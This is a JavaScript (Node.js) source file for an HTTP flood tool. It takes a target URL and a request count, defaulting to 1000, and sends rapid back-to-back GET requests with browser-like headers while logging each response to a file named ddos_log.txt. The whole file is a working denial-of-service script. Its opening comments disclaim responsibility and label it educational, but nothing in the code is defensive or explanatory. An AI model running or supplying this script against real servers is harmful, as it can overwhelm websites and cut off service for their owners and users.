// WARNING: This tool is for educational/testing purposes ONLY.
// Misuse can result in severe legal consequences. Use at your own risk.

// DISCLAIMER: I am NOT responsible for any damage or legal issues caused by the use of this tool.

const colors = {
  darkGreen: '\x1b[32m',
  purple: '\x1b[35m',
  darkRed: '\x1b[31m',
  darkBlue: '\x1b[34m',
  reset: '\x1b[0m'
};

const targetURL = process.argv[2];
const numRequests = process.argv[3] || 1000; // Default to 1000 requests
const logFile = 'ddos_log.txt';
const fs = require('fs');
const http = require('http');
const https = require('https');
const { URL } = require('url');

if (!targetURL) {
  console.log(colors.darkRed + 'Usage: node http_flood.js <target_url> [number_of_requests]' + colors.reset);
  process.exit(1);
}

const parsedURL = new URL(targetURL);
const protocol = parsedURL.protocol === 'https:' ? https : http;
const hostname = parsedURL.hostname;
const path = parsedURL.pathname;

console.log(colors.darkGreen + `Flooding ${targetURL} with ${numRequests} requests...` + colors.reset);

function log(message) {
  const timestamp = new Date().toISOString();
  const logMessage = `[${timestamp}] ${message}\n`;
  fs.appendFile(logFile, logMessage, (err) => {
    if (err) {
      console.error(colors.darkRed + 'Error writing to log file:' + colors.reset, err);
    }
  });
  console.log(colors.purple + logMessage + colors.reset);
}

let requestsSent = 0;

function flood() {
  if (requestsSent >= numRequests) {
    log(colors.darkBlue + 'Flood completed.' + colors.reset);
    return;
  }

  const options = {
    hostname: hostname,
    path: path,
    method: 'GET', // Or POST, HEAD, etc.
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.5',
      'Connection': 'keep-alive',
      'Upgrade-Insecure-Requests': '1'
    }
  };

  const req = protocol.request(options, (res) => {
    log(colors.darkGreen + `Request sent: ${res.statusCode} ${res.statusMessage}` + colors.reset);
  });

  req.on('error', (error) => {
    log(colors.darkRed + `Request error: ${error.message}` + colors.reset);
  });

  req.end();
  requestsSent++;
  setTimeout(flood, 0); // Adjust delay as needed
}

log(colors.darkBlue + 'Starting the flood...' + colors.reset);
flood();